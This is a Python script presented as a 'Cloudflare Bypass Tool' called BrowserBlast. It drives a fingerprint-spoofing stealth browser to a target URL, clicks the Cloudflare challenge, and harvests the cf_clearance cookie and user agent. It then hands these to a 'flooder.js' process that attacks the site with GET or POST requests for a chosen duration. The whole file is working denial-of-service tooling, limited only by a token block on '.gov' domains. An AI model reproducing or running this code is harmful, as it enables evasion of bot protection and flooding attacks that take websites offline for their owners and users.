import asyncio
import subprocess
import sys
import random
from dataclasses import dataclass
from typing import Any, Dict
from datetime import datetime

from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen
from colorama import init, Fore, Style

init(autoreset=True)

@dataclass
class CloudflareCookie:
    name: str
    value: str
    domain: str
    path: str
    expires: int
    http_only: bool
    secure: bool
    same_site: str

    @classmethod
    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
        return cls(
            name=cookie_data.get("name", ""),
            value=cookie_data.get("value", ""),
            domain=cookie_data.get("domain", ""),
            path=cookie_data.get("path", "/"),
            expires=cookie_data.get("expires", 0),
            http_only=cookie_data.get("httpOnly", False),
            secure=cookie_data.get("secure", False),
            same_site=cookie_data.get("sameSite", "Lax"),
        )

class BrowserBlast:
    def __init__(self, sleep_time=3, headless=True, os=None, debug=False, retries=10):
        self.cf_clearance = None
        self.sleep_time = sleep_time
        self.headless = headless
        self.os = os or ["windows"]
        self.debug = debug
        self.retries = retries
        self.start_time = None
        self.blacklist_domains = ['.gov']

    def print_banner(self):
        print(f"{Fore.MAGENTA}")
        print("🚀 BROWSERBLAST - Cloudflare Bypass Tool")
        print("========================================")
        print(f"{Style.RESET_ALL}")

    def check_blacklist(self, url: str) -> bool:
        for domain in self.blacklist_domains:
            if domain in url.lower():
                return True
        return False

    async def solve(self, link: str):
        if self.check_blacklist(link):
            print(f"{Fore.MAGENTA}[BLOCKED]{Style.RESET_ALL} Target domain is restricted")
            return None, None

        self.start_time = datetime.now()
        try:
            print(f"{Fore.MAGENTA}[INIT]{Style.RESET_ALL} Starting stealth browser...")
            
            async with AsyncCamoufox(
                headless=self.headless,
                os=self.os,
                screen=Screen(max_width=1920, max_height=1080),
                args=[
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-infobars",
                    "--start-maximized",
                    "--lang=en-US,en;q=0.9",
                    "--window-size=1920,1080",
                ]
            ) as browser:
                page = await browser.new_page()
                await page.set_viewport_size({"width": 1920, "height": 1080})
                
                print(f"{Fore.MAGENTA}[NAVIGATE]{Style.RESET_ALL} Going to: {link}")
                await page.goto(link)
                
                print(f"{Fore.MAGENTA}[PROCESS]{Style.RESET_ALL} Solving Cloudflare...")
                
                max_wait_time = 30
                wait_interval = 2
                
                for wait_cycle in range(max_wait_time // wait_interval):
                    await asyncio.sleep(wait_interval)
                    
                    title = await page.title()
                    url = page.url
                    frames = len(page.frames)
                    
                    elapsed = (datetime.now() - self.start_time).seconds
                    print(f"{Fore.MAGENTA}[WAIT {elapsed}s]{Style.RESET_ALL} Title: '{title}' | Frames: {frames}")
                    
                    if "just a moment" not in title.lower() and "checking your browser" not in title.lower():
                        print(f"{Fore.MAGENTA}[SOLVED]{Style.RESET_ALL} Challenge completed!")
                        break
                    
                    challenge_frame_found = False
                    for frame in page.frames:
                        if "challenges.cloudflare.com" in frame.url:
                            if not challenge_frame_found:
                                print(f"{Fore.MAGENTA}[ACTION]{Style.RESET_ALL} Clicking challenge...")
                                try:
                                    frame_element = await frame.frame_element()
                                    box = await frame_element.bounding_box()
                                    if box:
                                        click_x = box["x"] + box["width"] / 2
                                        click_y = box["y"] + box["height"] / 2
                                        await page.mouse.click(click_x, click_y)
                                        challenge_frame_found = True
                                except Exception as e:
                                    print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} Click failed: {e}")
                
                print(f"{Fore.MAGENTA}[COOKIES]{Style.RESET_ALL} Getting cookies...")
                await asyncio.sleep(5)
                
                cookies = await page.context.cookies()
                ua = await page.evaluate("() => navigator.userAgent")
                
                print(f"{Fore.MAGENTA}[DEBUG]{Style.RESET_ALL} Found {len(cookies)} cookies")
                
                cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)
                
                if cf_cookie:
                    solve_time = (datetime.now() - self.start_time).seconds
                    print(f"{Fore.MAGENTA}[SUCCESS]{Style.RESET_ALL} Got cf_clearance in {solve_time}s")
                    return cf_cookie['value'], ua
                else:
                    cf_cookies = [c for c in cookies if any(cf_name in c["name"].lower() for cf_name in ['cf', '__cf', 'cloudflare'])]
                    
                    if cf_cookies:
                        best_cookie = cf_cookies[0]
                        solve_time = (datetime.now() - self.start_time).seconds
                        print(f"{Fore.MAGENTA}[FALLBACK]{Style.RESET_ALL} Using {best_cookie['name']}")
                        return best_cookie['value'], ua
                    else:
                        print(f"{Fore.MAGENTA}[FAILED]{Style.RESET_ALL} No Cloudflare cookies")
                        return None, None

        except Exception as e:
            print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} {e}")
            return None, None

async def blast_target(url: str, duration: int, method: str):
    solver = BrowserBlast()
    solver.print_banner()
    
    max_attempts = 5
    cookie = None
    ua = None

    for attempt in range(1, max_attempts + 1):
        print(f"{Fore.MAGENTA}[ATTEMPT {attempt}]{Style.RESET_ALL} Solving Cloudflare")
        cookie, ua = await solver.solve(url)
        if cookie and ua:
            break
        print(f"{Fore.MAGENTA}[RETRY]{Style.RESET_ALL} Trying again...")

    if not cookie or not ua:
        print(f"{Fore.MAGENTA}[ABORT]{Style.RESET_ALL} Failed after {max_attempts} attempts")
        return

    print(f"{Fore.MAGENTA}[TOKEN]{Style.RESET_ALL} cf_clearance: {cookie}")
    print(f"{Fore.MAGENTA}[AGENT]{Style.RESET_ALL} User-Agent: {ua}")
    print(f"{Fore.MAGENTA}[METHOD]{Style.RESET_ALL} Attack method: {method}")
    print(f"{Fore.MAGENTA}[ATTACK]{Style.RESET_ALL} Running for {duration} seconds...\n")

    parcok = f"cf_clearance={cookie}"

    args = [
        "node", "flooder.js", url, str(duration), parcok, ua, method
    ]

    proc = subprocess.Popen(
       args,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in proc.stdout:
         print(line, end='')

    proc.wait()
    print(f"{Fore.MAGENTA}[DONE]{Style.RESET_ALL} Attack completed")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"{Fore.MAGENTA}[USAGE]{Style.RESET_ALL} python3 browser.py <url> <time> <GET/POST>")
        sys.exit(1)

    url = sys.argv[1]
    
    if '.gov' in url.lower():
        print(f"{Fore.MAGENTA}[BLOCKED]{Style.RESET_ALL} Government domains are not allowed")
        sys.exit(1)
        
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} Duration must be a number")
        sys.exit(1)

    method = sys.argv[3].upper()
    if method not in ['GET', 'POST']:
        print(f"{Fore.MAGENTA}[ERROR]{Style.RESET_ALL} Method must be GET or POST")
        sys.exit(1)

    asyncio.run(blast_target(url, duration, method))
